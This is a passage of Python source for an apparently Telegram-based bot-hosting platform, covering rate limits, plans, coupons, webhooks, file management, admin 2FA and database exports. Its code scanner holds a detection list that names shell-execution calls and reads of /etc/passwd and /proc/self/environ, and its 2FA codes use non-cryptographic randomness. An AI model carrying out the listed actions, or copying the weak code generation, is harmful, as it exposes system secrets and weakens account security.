Admin-overridable global rate-limit lookup. Added because
    `_rate_check()` below called this and it was never defined anywhere —
    `_rate_check` itself isn't called from anywhere else in this file today
    (the live rate limiting is RATE.allow(uid) in cb_root, plus the
    per-plan _RATE_LIMIT_DEFAULTS system elsewhere), so this was inert
    dead code rather than an active bug — fixed anyway so it's not a
    landmine if something wires it up later.
    """
    return int(get_setting(f"rl_{key}", _GLOBAL_RATE_DEFAULTS.get(key, 30)))


def _rate_check(uid, action="msg"):
    cfg = {
        "msg":       (_rl_get("msg_per_min"),        60),
        "callback":  (_rl_get("cb_per_min"),         60),
        "upload":    (_rl_get("upload_per_hour"),   3600),
        "start_bot": (_rl_get("bot_start_per_hour"),3600),
    }
    limit, window = cfg.get(action, (60, 60))
    key = f"{uid}:{action}"
    now = time.time()
    with _RATE_LOCK:
        bucket = _RATE_BUCKETS.get(key, {"count": 0, "window_start": now})
        if now - bucket["window_start"] > window:
            bucket = {"count": 0, "window_start": now}
        bucket["count"] += 1
        _RATE_BUCKETS[key] = bucket
        return bucket["count"] <= limit


def _rate_cleanup_loop():
    while True:
        time.sleep(300)
        now = time.time()
        with _RATE_LOCK:
            stale = [k for k, v in _RATE_BUCKETS.items() if now - v["window_start"] > 7200]
            for k in stale:
                _RATE_BUCKETS.pop(k, None)


# ─── Plan Enforcement ───────────────────────────────────────────────────────

def _plan_enforce_bot_limit(uid):
    d = db_load()
    u = d["users"].get(str(uid), {})
    plan   = u.get("plan", "free") or "free"
    limits = PLAN_LIMITS.get(plan, PLAN_LIMITS["free"])
    max_b  = limits.get("bots", 1)
    if max_b == -1:
        return True, ""
    cur = sum(1 for b in d["bots"].values() if str(b.get("owner")) == str(uid))
    if cur >= max_b:
        return False, f"Plan limit: {max_b} bots. You have {cur}. Upgrade to add more."
    return True, ""


def _plan_enforce_upload_size(uid, size_bytes):
    d = db_load()
    u = d["users"].get(str(uid), {})
    plan   = u.get("plan", "free") or "free"
    limits = PLAN_LIMITS.get(plan, PLAN_LIMITS["free"])
    max_mb = limits.get("max_upload_mb", 50)
    if max_mb == -1:
        return True, ""
    if size_bytes > max_mb * 1024 * 1024:
        return False, f"File {fmt_bytes(size_bytes)} > plan limit {max_mb} MB. Upgrade!"
    return True, ""


def _plan_check_expiry(uid):
    d = db_load()
    u = d["users"].get(str(uid), {})
    plan    = u.get("plan", "free") or "free"
    expires = u.get("plan_expires")
    if plan == "free" or not expires:
        return True
    if expires < ts_iso():
        u["plan"]         = "free"
        u["plan_expires"] = None
        u.setdefault("transactions", []).append({
            "type": "downgrade", "ts": ts_iso(), "from_plan": plan, "reason": "expired"
        })
        db_save(d)
        _notif_enqueue(uid,
            f"<b>{G['warn']} Plan expired</b>\n"
            f"Your <b>{plan}</b> plan expired. Downgraded to Free.",
            parse_mode="HTML"
        )
        return False
    return True


# ─── Webhook Delivery ───────────────────────────────────────────────────────

def _wh_deliver(event, payload):
    url    = get_setting("webhook_url", "")
    if not url:
        return
    secret = get_setting("webhook_secret", "") or ""
    import json as _json
    body   = _json.dumps({"event": event, "payload": payload, "ts": ts_iso()})
    headers = {"Content-Type": "application/json"}
    if secret:
        import hmac, hashlib
        headers["X-Webhook-Signature"] = hmac.new(
            secret.encode(), body.encode(), hashlib.sha256).hexdigest()
    try:
        import urllib.request as _ur
        req = _ur.Request(url, data=body.encode(), headers=headers, method="POST")
        with _ur.urlopen(req, timeout=10) as r:
            status = r.status
        _wh_log(event, status)
    except Exception as e:
        _wh_log(event, f"error:{e}")


def _wh_log(event, status):
    log = get_setting("webhook_log", []) or []
    log.append({"event": event, "ts": ts_iso(), "status": str(status)})
    if len(log) > 100:
        log = log[-100:]
    set_setting("webhook_log", log)


def _wh_fire(event, payload):
    if not get_setting("webhook_enabled", False):
        return
    threading.Thread(target=_wh_deliver, args=(event, payload), daemon=True).start()


# ─── Subscription Engine ────────────────────────────────────────────────────

def _sub_check_all_expiries():
    d = db_load()
    downgraded = []
    for uid_s, u in d["users"].items():
        plan    = u.get("plan", "free") or "free"
        expires = u.get("plan_expires")
        if plan != "free" and expires and expires < ts_iso():
            old = plan
            u["plan"] = "free"; u["plan_expires"] = None
            u.setdefault("transactions", []).append({
                "type": "downgrade", "ts": ts_iso(), "from_plan": old, "reason": "expired"})
            downgraded.append((int(uid_s), old))
    if downgraded:
        db_save(d)
        for uid, op in downgraded:
            try:
                bot.send_message(uid,
                    f"<b>{G['warn']} Plan Expired</b>\n{op} → Free. Renew to restore.",
                    parse_mode="HTML")
            except Exception:
                pass
    return downgraded


def _sub_renewal_reminders():
    d = db_load()
    from datetime import timedelta
    threshold = (now_utc() + timedelta(days=3)).isoformat()
    sent = 0
    for uid_s, u in d["users"].items():
        plan    = u.get("plan", "free") or "free"
        expires = u.get("plan_expires", "")
        if plan == "free" or not expires:
            continue
        if ts_iso() < expires <= threshold:
            today = now_utc().strftime("%Y-%m-%d")
            if u.get("last_renewal_reminder") == today:
                continue
            try:
                bot.send_message(int(uid_s),
                    f"<b>{G['warn']} Plan Expiring Soon</b>\n"
                    f"{bullet('Plan', plan)}\n{bullet('Expires', expires[:10])}\n"
                    f"Renew now to avoid downtime!", parse_mode="HTML")
                u["last_renewal_reminder"] = today
                sent += 1
            except Exception:
                pass
    if sent:
        db_save(d)
    return sent


def _catalog_expiry_reminders() -> int:
    now = now_utc(); threshold = now + timedelta(days=7); today = now.strftime("%Y-%m-%d")
    d = db_load(); sent = 0; changed = False
    for uid_s, user in d.get("users", {}).items():
        candidates = []
        if user.get("plan_expires"):
            candidates.append(("plan", "Your plan", user.get("plan_expires")))
        for index, grant in enumerate(user.get("bot_slot_grants", []) or []):
            if isinstance(grant, dict) and grant.get("expires"):
                candidates.append((f"slot_{index}", "A bot slot", grant.get("expires")))
        for product_id, access in (user.get("product_access", {}) or {}).items():
            if isinstance(access, dict) and access.get("expires"):
                candidates.append((f"file_{product_id}", "A catalog file", access.get("expires")))
        for key, label in (("ref_credit_expires", "Referral credits"), ("file_coin_expires", "File coins")):
            if user.get(key):
                candidates.append((key, label, user.get(key)))
        notices = user.setdefault("expiry_notices", {})
        for kind, label, raw_expiry in candidates:
            try: expiry = datetime.fromisoformat(str(raw_expiry).replace("Z", "+00:00"))
            except (TypeError, ValueError): continue
            if now < expiry <= threshold and notices.get(kind) != today:
                try:
                    bot.send_message(int(uid_s), f"<b>⚠️ Expiring soon</b>\n{esc(label)} expires on <b>{expiry.strftime('%Y-%m-%d')}</b>.", parse_mode="HTML")
                    notices[kind] = today; sent += 1; changed = True
                except Exception: pass
    if changed: db_save(d)
    return sent


def _sub_reminder_loop():
    while True:
        time.sleep(3600)
        try:
            _sub_check_all_expiries()
        except Exception:
            pass
        try:
            _sub_renewal_reminders()
        except Exception:
            pass
        try:
            _catalog_expiry_reminders()
        except Exception:
            pass


# ─── Coupon Engine ──────────────────────────────────────────────────────────

def _coupon_validate(code, uid):
    d = db_load()
    normalized_code = code.upper()
    c = d.get("coupons", {}).get(normalized_code)
    if not c:
        return False, "Invalid coupon code.", {}
    if c.get("expiry") and c["expiry"] < ts_iso():
        return False, "Coupon expired.", {}
    uses_left = c.get("uses_left")
    if uses_left is not None and uses_left <= 0:
        return False, "No uses remaining.", {}
    user = d.get("users", {}).get(str(uid), {})
    prior_user_redemptions = user.get("coupons_used", []) or []
    if uid in c.get("used_by", []) or normalized_code in prior_user_redemptions:
        return False, "Already used.", {}
    return True, "", c


def _coupon_target_plan(coupon: Dict[str, Any]) -> Optional[str]:
    """Return the paid plan granted by a promo coupon, if it has one.

    Coupons without a specific plan (including legacy ``all`` coupons) remain
    discount coupons and are applied to the next plan purchase. A coupon with
    a concrete paid-plan target is a redemption promo: it is consumed here
    and activates that plan immediately.
    """
    plan = str(coupon.get("plan", "all") or "all").strip().lower()
    if plan in {"", "all", "free"} or plan not in PLAN_LIMITS:
        return None
    return plan


def _coupon_redeem(code, uid):
    valid, err, c = _coupon_validate(code, uid)
    if not valid:
        return False, err, 0.0
    d    = db_load()
    coup = d.setdefault("coupons", {}).setdefault(code.upper(), c)
    user = d.setdefault("users", {}).get(str(uid))
    if not user:
        return False, "User not found.", 0.0
    coup.setdefault("used_by", []).append(uid)
    if coup.get("uses_left") is not None:
        coup["uses_left"] = max(0, coup["uses_left"] - 1)
    user.setdefault("coupons_used", []).append(code.upper())
    target_plan = _coupon_target_plan(coup)
    if target_plan:
        # A plan promo is redeemed at this point, not held for a later paid
        # purchase. Clear any older discount so it cannot be applied later.
        user.pop("active_coupon", None)
    else:
        user["active_coupon"] = code.upper()
    db_save(d)
    discount = float(c.get("discount_pct", 0))
    flat     = float(c.get("discount_flat", 0))
    if target_plan and not grant_plan(uid, target_plan, notify=False):
        return False, "Could not activate the promo plan.", 0.0
    _wh_fire("coupon_redeemed", {"code": code.upper(), "uid": uid,
                                  "discount_pct": discount, "discount_flat": flat,
                                  "plan": target_plan or ""})
    if target_plan:
        plan_name = PLAN_LIMITS[target_plan].get("name", target_plan)
        return True, f"Promo activated! {plan_name} plan", discount
    return True, f"Coupon applied! Discount: {discount}% / flat {flat}", discount


def _active_bundle_discount(plan: str) -> float:
    campaign = get_setting("bundle_campaign", {}) or {}
    if not isinstance(campaign, dict) or not campaign.get("enabled"):
        return 0.0
    ends = str(campaign.get("ends", ""))
    if ends and ends < now_utc().strftime("%Y-%m-%d"):
        return 0.0
    target = str(campaign.get("plan", "all"))
    return float(campaign.get("discount_pct", 0) or 0) if target in {"all", str(plan)} else 0.0


# ─── File Manager ───────────────────────────────────────────────────────────

def _fm_list_bot_files(bot_id):
    b = find_bot(bot_id)
    if not b:
        return []
    sbox = Path(b.get("sandbox", ""))
    if not sbox.exists():
        return []
    result = []
    try:
        for p in sorted(sbox.rglob("*")):
            if p.is_file():
                result.append({
                    "name": str(p.relative_to(sbox)),
                    "size": p.stat().st_size,
                })
    except Exception:
        pass
    return result


def _fm_read_file(bot_id, rel_path, max_bytes=32768):
    b = find_bot(bot_id)
    if not b:
        return "", False
    sbox   = Path(b.get("sandbox", ""))
    target = (sbox / rel_path).resolve()
    try:
        target.relative_to(sbox.resolve())
    except ValueError:
        return "Access denied.", False
    if not target.exists():
        return "File not found.", False
    data = target.read_bytes()
    trunc = len(data) > max_bytes
    return data[:max_bytes].decode("utf-8", errors="replace"), trunc


def _fm_write_file(bot_id, rel_path, content):
    b = find_bot(bot_id)
    if not b:
        return False
    sbox   = Path(b.get("sandbox", ""))
    target = (sbox / rel_path).resolve()
    try:
        target.relative_to(sbox.resolve())
    except ValueError:
        return False
    target.parent.mkdir(parents=True, exist_ok=True)
    try:
        target.write_text(content, encoding="utf-8")
        return True
    except Exception:
        return False


def _fm_zip_sandbox(bot_id):
    import zipfile as _zf
    b = find_bot(bot_id)
    if not b:
        return None
    sbox = Path(b.get("sandbox", ""))
    if not sbox.exists():
        return None
    zip_path = DIRS["tmp"] / f"{bot_id}_export_{int(time.time())}.zip"
    try:
        with _zf.ZipFile(zip_path, "w", _zf.ZIP_DEFLATED) as z:
            for p in sbox.rglob("*"):
                if p.is_file():
                    z.write(p, p.relative_to(sbox))
        return zip_path
    except Exception:
        return None


# ─── Broadcast Engine ───────────────────────────────────────────────────────

_BROADCAST_ACTIVE = {}


def _broadcast_job(job_id, uids, msg, parse_mode="HTML", delay=0.05):
    _BROADCAST_ACTIVE[job_id] = {"total": len(uids), "sent": 0, "failed": 0, "done": False}
    for uid in uids:
        try:
            bot.send_message(uid, msg, parse_mode=parse_mode)
            _BROADCAST_ACTIVE[job_id]["sent"] += 1
        except Exception:
            _BROADCAST_ACTIVE[job_id]["failed"] += 1
        time.sleep(delay)
    _BROADCAST_ACTIVE[job_id]["done"] = True


def _broadcast_start(uids, msg, parse_mode="HTML"):
    import random, string
    job_id = "bc_" + "".join(random.choices(string.ascii_lowercase, k=8))
    threading.Thread(target=_broadcast_job, args=(job_id, uids, msg, parse_mode),
                     daemon=True, name=f"broadcast-{job_id}").start()
    return job_id


# ─── Metrics ────────────────────────────────────────────────────────────────

_METRICS = {
    "messages_received": 0, "callbacks_received": 0, "bot_starts": 0,
    "bot_stops": 0, "bot_crashes": 0, "uploads": 0, "errors": 0,
    "commands": 0, "plan_upgrades": 0, "payments_received": 0,
}
_METRICS_LOCK = threading.Lock()


def _metric(key, n=1):
    with _METRICS_LOCK:
        _METRICS[key] = _METRICS.get(key, 0) + n


def _metrics_snapshot():
    with _METRICS_LOCK:
        return dict(_METRICS)


def _metrics_persist_loop():
    while True:
        time.sleep(300)
        try:
            snap = _metrics_snapshot()
            existing = get_setting("metrics_total", {}) or {}
            for k, v in snap.items():
                existing[k] = existing.get(k, 0) + v
            set_setting("metrics_total", existing)
            with _METRICS_LOCK:
                for k in _METRICS:
                    _METRICS[k] = 0
        except Exception:
            pass


# ─── Security Engine ────────────────────────────────────────────────────────

def _security_scan_code(content):
    patterns = [
        "os.system", "subprocess.call", "eval(compile", "__import__('os').system",
        "open('/etc/passwd')", "/proc/self/environ", "exec(base64",
    ]
    warnings_found = []
    for i, line in enumerate(content.split("\n"), 1):
        for pat in patterns:
            if pat in line:
                warnings_found.append(f"Line {i}: {pat}")
    return warnings_found


def _security_audit_log(uid, action, detail="", risk="low"):
    entry = {"uid": uid, "action": action, "detail": detail, "risk": risk, "ts": ts_iso()}
    log = get_setting("security_audit_log", []) or []
    log.append(entry)
    if len(log) > 500:
        log = log[-500:]
    set_setting("security_audit_log", log)
    if risk in ("high", "critical"):
        try:
            notify_owner(
                f"<b>{G['warn']} Security Alert [{risk.upper()}]</b>\n"
                f"{bullet('User', uid)}\n{bullet('Action', action)}\n"
                f"{bullet('Detail', esc(str(detail)[:200]))}"
            )
        except Exception:
            pass


def _security_detect_token_leak(content):
    import re
    return bool(re.compile(r"\d{8,10}:[A-Za-z0-9_-]{35}", re.MULTILINE).search(content))


# ─── Template Engine ────────────────────────────────────────────────────────

def _tmpl_render(key, ctx):
    templates = get_setting("message_templates", {}) or {}
    template  = templates.get(key) or _MESSAGE_TEMPLATES.get(key, "")
    if not template:
        return ""
    try:
        return template.format_map(ctx)
    except (KeyError, ValueError):
        return template


def _tmpl_list():
    return {**dict(_MESSAGE_TEMPLATES), **(get_setting("message_templates", {}) or {})}


def _tmpl_reset_one(key):
    templates = get_setting("message_templates", {}) or {}
    if key in templates:
        del templates[key]
        set_setting("message_templates", templates)
        return True
    return False


# ─── User Profile Engine ────────────────────────────────────────────────────

def _user_activity_score(uid):
    d = db_load()
    u = d["users"].get(str(uid), {})
    score = 0
    score += sum(1 for b in d["bots"].values() if str(b.get("owner")) == str(uid)) * 10
    score += {"free": 0, "basic": 20, "pro": 50, "ultra": 100}.get(
        u.get("plan", "free") or "free", 0)
    score += len(u.get("referrals", [])) * 15
    joined = u.get("joined", "")
    if joined:
        try:
            from datetime import datetime, timezone
            dt = datetime.fromisoformat(joined)
            if dt.tzinfo is None:
                dt = dt.replace(tzinfo=timezone.utc)
            score += min((now_utc() - dt).days, 365)
        except Exception:
            pass
    return score


def _user_get_badges(uid):
    d = db_load()
    u = d["users"].get(str(uid), {})
    badges = []
    plan   = u.get("plan", "free") or "free"
    if plan == "ultra":   badges.append("💎 Ultra Member")
    elif plan == "pro":   badges.append("🥇 Pro Member")
    elif plan == "basic": badges.append("🥈 Basic Member")
    bot_count = sum(1 for b in d["bots"].values() if str(b.get("owner")) == str(uid))
    if bot_count >= 10: badges.append("🤖 Bot Master (10+)")
    elif bot_count >= 5: badges.append("🤖 Bot Expert (5+)")
    elif bot_count >= 1: badges.append("🤖 Bot Hoster")
    refs = len(u.get("referrals", []))
    if refs >= 50:  badges.append("👑 Referral King (50+)")
    elif refs >= 10: badges.append("🌟 Top Referrer (10+)")
    elif refs >= 1:  badges.append("👥 Referrer")
    if _user_activity_score(uid) >= 200: badges.append("🔥 Power User")
    return badges


def _user_profile_card(uid):
    d    = db_load()
    u    = d["users"].get(str(uid), {})
    if not u:
        return "User not found."
    plan   = u.get("plan", "free") or "free"
    p_lim  = PLAN_LIMITS.get(plan, PLAN_LIMITS["free"])
    bots   = sum(1 for b in d["bots"].values() if str(b.get("owner")) == str(uid))
    run    = sum(1 for b in d["bots"].values()
                 if str(b.get("owner")) == str(uid) and b.get("status") == "running")
    badges = _user_get_badges(uid)
    score  = _user_activity_score(uid)
    return (
        f"<b>👤 {esc(u.get('name', str(uid)))}</b>\n"
        f"{G['div_eq']}\n"
        + bullet("UID", uid) + "\n"
        + bullet("Plan", p_lim.get("name", plan)) + "\n"
        + bullet("Bots", f"{bots} ({run} running)") + "\n"
        + bullet("Score", score) + "\n"
        + bullet("Badges", len(badges)) + "\n"
        + G["div"] + "\n"
        + "\n".join(f"  • {b}" for b in badges)
    )


# ─── Revenue Engine ─────────────────────────────────────────────────────────

def _rev_projected_monthly():
    day = now_utc().day or 1
    return round(_rev_this_month() / day * 30, 2)


# ─── Leaderboard Engine ─────────────────────────────────────────────────────

def _lb_top_by_bots(n=10):
    d = db_load()
    counts = {}
    for b in d["bots"].values():
        uid = str(b.get("owner", ""))
        counts[uid] = counts.get(uid, 0) + 1
    rows = [(uid, d["users"].get(uid, {}).get("name", uid), cnt)
            for uid, cnt in counts.items()]
    rows.sort(key=lambda x: x[2], reverse=True)
    return rows[:n]


def _lb_top_by_referrals(n=10):
    d = db_load()
    rows = [(uid, u.get("name", uid), len(u.get("referrals", [])))
            for uid, u in d["users"].items() if u.get("referrals")]
    rows.sort(key=lambda x: x[2], reverse=True)
    return rows[:n]


def _lb_top_by_revenue(n=10):
    d = db_load()
    rev = {}
    for uid, u in d["users"].items():
        total = sum(float(tx.get("amount", 0))
                    for tx in u.get("transactions", [])
                    if tx.get("type") in ("payment", "upgrade", "renewal"))
        if total > 0:
            rev[uid] = (u.get("name", uid), total)
    rows = [(uid, name, amt) for uid, (name, amt) in rev.items()]
    rows.sort(key=lambda x: x[2], reverse=True)
    return rows[:n]


def _lb_top_by_score(n=10):
    d = db_load()
    rows = [(uid, u.get("name", uid), _user_activity_score(int(uid)))
            for uid, u in d["users"].items()]
    rows.sort(key=lambda x: x[2], reverse=True)
    return rows[:n]


# ─── Language Engine ────────────────────────────────────────────────────────

_TRANSLATIONS = {
    "en": {"welcome": "Welcome to {brand}!", "plan_expired": "Your plan has expired.",
           "bot_started": "Bot {name} is now running!", "bot_crashed": "Bot {name} crashed.",
           "payment_received": "Payment received! Plan will be updated shortly.",
           "referral_earned": "You earned {amount} credits for referring {user}!"},
    "bn": {"welcome": "{brand}-এ আপনাকে স্বাগতম!", "plan_expired": "আপনার প্ল্যানের মেয়াদ শেষ হয়েছে।",
           "bot_started": "{name} বট এখন চালু আছে!", "bot_crashed": "{name} বট বন্ধ হয়ে গেছে।",
           "payment_received": "পেমেন্ট গ্রহণ করা হয়েছে! প্ল্যান শীঘ্রই আপডেট হবে।",
           "referral_earned": "{user}-কে রেফার করে আপনি {amount} ক্রেডিট পেয়েছেন!"},
    "hi": {"welcome": "{brand} में आपका स्वागत है!", "plan_expired": "आपका प्लान समाप्त हो गया।",
           "bot_started": "बॉट {name} चल रहा है!", "bot_crashed": "बॉट {name} क्रैश हो गया।",
           "payment_received": "भुगतान प्राप्त हुआ!", "referral_earned": "{user} रेफर पर {amount} क्रेडिट मिले!"},
    "ru": {"welcome": "Добро пожаловать в {brand}!", "plan_expired": "Срок плана истёк.",
           "bot_started": "Бот {name} запущен!", "bot_crashed": "Бот {name} упал.",
           "payment_received": "Платёж получен!", "referral_earned": "Заработано {amount} кредитов за {user}!"},
    "ar": {"welcome": "مرحباً في {brand}!", "plan_expired": "انتهت صلاحية خطتك.",
           "bot_started": "البوت {name} يعمل الآن!", "bot_crashed": "تعطل البوت {name}.",
           "payment_received": "تم استلام الدفعة!", "referral_earned": "ربحت {amount} رصيداً لإحالة {user}!"},
    "es": {"welcome": "¡Bienvenido a {brand}!", "plan_expired": "Tu plan ha expirado.",
           "bot_started": "¡El bot {name} está activo!", "bot_crashed": "El bot {name} falló.",
           "payment_received": "¡Pago recibido!", "referral_earned": "¡Ganaste {amount} créditos por referir a {user}!"},
    "tr": {"welcome": "{brand}'e hoş geldiniz!", "plan_expired": "Planın süresi doldu.",
           "bot_started": "{name} botu çalışıyor!", "bot_crashed": "{name} botu çöktü.",
           "payment_received": "Ödeme alındı!", "referral_earned": "{user} için {amount} kredi kazandın!"},
}


def _lang_get_user(uid):
    d = db_load_ro()
    lang = d.get("users", {}).get(str(uid), {}).get("lang")
    lang = lang or get_setting("default_language", get_setting("ui_language", "en")) or "en"
    return lang if lang in _SUPPORTED_LANGUAGES else "en"


def _lang_set_user(uid, lang):
    lang = str(lang or "").lower().strip()
    if lang not in _SUPPORTED_LANGUAGES:
        return False
    d = db_load()
    if str(uid) in d["users"]:
        d["users"][str(uid)]["lang"] = lang
        db_save(d)
        return True
    return False


def render_user_languages(call: types.CallbackQuery) -> None:
    uid = call.from_user.id
    current = _lang_get_user(uid)
    cap = (f"<b>🌍 {sc('Choose your language')}</b>\n{G['div_eq']}\n"
           f"{bullet('Current language', _SUPPORTED_LANGUAGES.get(current, current))}\n"
           f"{sc('Your choice is saved to your profile and used for translated messages and notifications.')}{FOOTER}")
    kb = types.InlineKeyboardMarkup(row_width=2)
    for code, name in _SUPPORTED_LANGUAGES.items():
        kb.add(Btn(f"{'✅ ' if code == current else ''}{name}", callback_data=f"lang_set_{code}", style="success" if code == current else "primary"))
    kb.add(Btn(f"{G['back']} Main Menu", callback_data="menu_main", style="danger"))
    show_menu(call.message.chat.id, PHOTOS.get("lang_panel", PHOTOS["main"]), cap, kb, call=call)


def _tr(uid, key, **ctx):
    lang  = _lang_get_user(uid)
    texts = _TRANSLATIONS.get(lang, _TRANSLATIONS["en"])
    tmpl  = texts.get(key) or _TRANSLATIONS["en"].get(key, key)
    try:
        return tmpl.format(**ctx)
    except (KeyError, ValueError):
        return tmpl


# ─── Feature Flags Engine ───────────────────────────────────────────────────

def _ff_get(key):
    flags = get_setting("feature_flags", {}) or {}
    return bool(flags.get(key, _FEATURE_FLAG_DEFAULTS.get(key, True)))


def _ff_set(key, val):
    flags = get_setting("feature_flags", {}) or {}
    flags[key] = bool(val)
    set_setting("feature_flags", flags)


def _ff_toggle(key):
    new_val = not _ff_get(key)
    _ff_set(key, new_val)
    return new_val


def _ff_reset_all():
    set_setting("feature_flags", dict(_FEATURE_FLAG_DEFAULTS))


# ─── 2FA Engine ─────────────────────────────────────────────────────────────

_2FA_CODES = {}
_2FA_LOCK  = threading.Lock()


def _2fa_generate(uid):
    import random
    code = str(random.randint(100000, 999999))
    with _2FA_LOCK:
        _2FA_CODES[uid] = {"code": code, "ts": time.time(), "attempts": 0}
    return code


def _2fa_verify(uid, code):
    with _2FA_LOCK:
        entry = _2FA_CODES.get(uid)
        if not entry:
            return False, "No active session. Request a new code."
        if time.time() - entry["ts"] > 300:
            _2FA_CODES.pop(uid, None)
            return False, "Code expired."
        if entry["attempts"] >= 3:
            _2FA_CODES.pop(uid, None)
            return False, "Too many attempts."
        entry["attempts"] += 1
        if entry["code"] == code.strip():
            _2FA_CODES.pop(uid, None)
            return True, ""
        return False, f"Wrong code. {3 - entry['attempts']} attempt(s) left."


def _2fa_is_enabled():
    return bool(get_setting("admin_2fa_enabled", False))


def _2fa_send_code(uid):
    code = _2fa_generate(uid)
    try:
        bot.send_message(uid,
            f"<b>🔐 Admin 2FA Code</b>\n\n<code>{code}</code>\n\nExpires in 5 minutes.",
            parse_mode="HTML")
        return True
    except Exception:
        return False


def _2fa_session_check(uid):
    sessions = get_setting("admin_2fa_sessions", {}) or {}
    ts = sessions.get(str(uid), {}).get("ts", 0)
    return (time.time() - ts) < 86400


def _2fa_session_create(uid):
    sessions = get_setting("admin_2fa_sessions", {}) or {}
    sessions[str(uid)] = {"ts": time.time()}
    set_setting("admin_2fa_sessions", sessions)


def _2fa_revoke_all():
    set_setting("admin_2fa_sessions", {})


# ─── Import/Export Engine ───────────────────────────────────────────────────

def _export_full_db():
    import json as _json
    payload = {
        "version": "2.0", "exported_at": ts_iso(),
        "db": db_load(), "settings": settings_load(),
    }
    return _json.dumps(payload, indent=2, default=str).encode("utf-8")


def _import_full_db(data):
    import json as _json
    try:
        payload = _json.loads(data.decode("utf-8"))
    except Exception as e:
        return False, f"JSON parse error: {e}"
    db_data = payload.get("db")
    if not isinstance(db_data, dict) or "users" not in db_data:
        return False, "Invalid DB structure."
    db_save(db_data)
    settings_data = payload.get("settings")
    if isinstance(settings_data, dict):
        settings_save(settings_data)
    return True, f"Imported {len(db_data['users'])} users, {len(db_data['bots'])} bots."


def _export_users_csv():
    import csv, io
    d   = db_load()
    buf = io.StringIO()
    fn  = ["uid","name","username","plan","plan_expires","joined","banned","credits","referrals","bots"]
    w   = csv.DictWriter(buf, fieldnames=fn)
    w.writeheader()
    for uid, u in d["users"].items():
        bc = sum(1 for b in d["bots"].values() if str(b.get("owner")) == uid)
        w.writerow({"uid": uid, "name": u.get("name",""), "username": u.get("username",""),
                    "plan": u.get("plan","free"), "plan_expires": u.get("plan_expires",""),
                    "joined": u.get("joined",""), "banned": u.get("banned",False),
                    "credits": u.get("credits",0), "referrals": len(u.get("referrals",[])), "bots": bc})
    return buf.getvalue().encode("utf-8")


def _export_bots_csv():
    import csv, io
    d   = db_load()
    buf = io.StringIO()
    fn  = ["bot_id","name","owner","status","created","main_file","crash_count","total_run_hours"]
    w   = csv.DictWriter(buf, fieldnames=fn)
    w.writeheader()
    for bid, b in d["bots"].items():
        w.writerow({"bot_id": bid, "name": b.get("name",""), "owner": b.get("owner",""),
                    "status": b.get("status","stopped"), "created": b.get("created",""),
                    "main_file": b.get("main_file",""), "crash_count": b.get("crash_count",0),
                    "total_run_hours": b.get("total_run_hours",0)})
    return buf.getvalue().encode("utf-8")


def _export_transactions_csv():
    import csv, io
    d   = db_load()
    buf = io.StringIO()
    fn  = ["uid","user_name","type","amount","plan","ts","note"]
    w   = csv.DictWriter(buf, fieldnames=fn)
    w.writeheader()
    for uid, u in d["users"].items():
        for tx in u.get("transactions", []):
            w.writerow({"uid": uid, "user_name": u.get("name",""), "type": tx.get("type",""),
                        "amount": tx.get("amount",0), "plan": tx.get("plan",""),
                        "ts": tx.get("ts",""), "note": tx.get("note","")})
    return buf.getvalue().encode("utf-8")


def _export_audit_log_csv():
    import csv, io
    log = get_setting("security_audit_log", []) or []
    buf = io.StringIO()
    fn  = ["ts","uid","action","detail","risk"]
    w   = csv.DictWriter(buf, fieldnames=fn)
    w.writeheader()
    for e in log:
        w.writerow({"ts": e.get("ts",""), "uid": e.get("uid",""), "action": e.get("action",""),
                    "detail": e.get("detail",""), "risk": e.get("risk","low")})
    return buf.getvalue().encode("utf-8")


# ─── Janitor Engine ─────────────────────────────────────────────────────────

def _janitor_purge_stale_tmp(max_age_hours=24):
    count  = 0
    cutoff = time.time() - max_age_hours * 3600
    for p in DIRS["tmp"].iterdir():
        try:
            if p.is_file() and p.stat().st_mtime < cutoff:
                p.unlink(); count += 1
        except Exception:
            pass
    return count


def _janitor_purge_empty_sandboxes():
    import shutil
    d           = db_load()
    valid_ids   = set(d["bots"].keys())
    sandbox_root= DIRS.get("sandboxes", BASE_DIR / "sandboxes")
    count       = 0
    if not sandbox_root.exists():
        return 0
    for p in sandbox_root.iterdir():
        if p.is_dir() and p.name not in valid_ids:
            try:
                shutil.rmtree(p); count += 1
            except Exception:
                pass
    return count


def _janitor_compact_db():
    d = db_load()
    tx_trunc = 0
    for u in d["users"].values():
        txs = u.get("transactions", [])
        if len(txs) > 200:
            u["transactions"] = txs[-200:]
            tx_trunc += len(txs) - 200
    orphan = [bid for bid, b in d["bots"].items() if not b.get("owner")]
    for bid in orphan:
        del d["bots"][bid]
    sessions = get_setting("admin_2fa_sessions", {}) or {}
    stale    = [k for k, v in sessions.items() if time.time() - v.get("ts",0) > 86400]
    for k in stale:
        sessions.pop(k, None)
    set_setting("admin_2fa_sessions", sessions)
    db_save(d)
    return {"tx_truncated": tx_trunc, "orphan_bots": len(orphan), "stale_sessions": len(stale)}


def _janitor_full_run():
    tmp_del  = _janitor_purge_stale_tmp()
    sbox_del = _janitor_purge_empty_sandboxes()
    ok, ver  = _do_clean_orphans()
    compact  = _janitor_compact_db()
    return {
        "tmp_files_deleted":    tmp_del,
        "empty_sandboxes":      sbox_del,
        "orphan_procs_killed":  ok,
        "orphan_procs_verified":ver,
        "tx_truncated":         compact["tx_truncated"],
        "orphan_bots_removed":  compact["orphan_bots"],
        "stale_sessions_purged":compact["stale_sessions"],
    }


# ─── Scheduler Engine ───────────────────────────────────────────────────────

def _sched_add_task(task_type, task_time, msg, target="all"):
    tasks = get_setting("scheduled_tasks", []) or []
    task  = {
        "id": f"task_{int(time.time())}", "type": task_type, "time": task_time,
        "msg": msg, "target": target, "enabled": True, "created": ts_iso(),
        "last_run": None, "run_count": 0,
    }
    tasks.append(task)
    set_setting("scheduled_tasks", tasks)
    return task


def _sched_remove_task(task_id):
    tasks = get_setting("scheduled_tasks", []) or []
    orig  = len(tasks)
    tasks = [t for t in tasks if t.get("id") != task_id]
    if len(tasks) < orig:
        set_setting("scheduled_tasks", tasks)
        return True
    return False


def _sched_toggle_task(task_id):
    tasks = get_setting("scheduled_tasks", []) or []
    for t in tasks:
        if t.get("id") == task_id:
            t["enabled"] = not t.get("enabled", True)
            set_setting("scheduled_tasks", tasks)
            return t["enabled"]
    return None


def _sched_broadcast(msg, target="all"):
    d    = db_load()
    uids = []
    for uid_s, u in d["users"].items():
        if u.get("banned"):
            continue
        if target == "all":
            uids.append(int(uid_s))
        elif target == "paid" and u.get("plan","free") not in ("free", None):
            uids.append(int(uid_s))
        elif target == "free" and u.get("plan","free") in ("free", None):
            uids.append(int(uid_s))
    sent = 0
    for uid in uids:
        try:
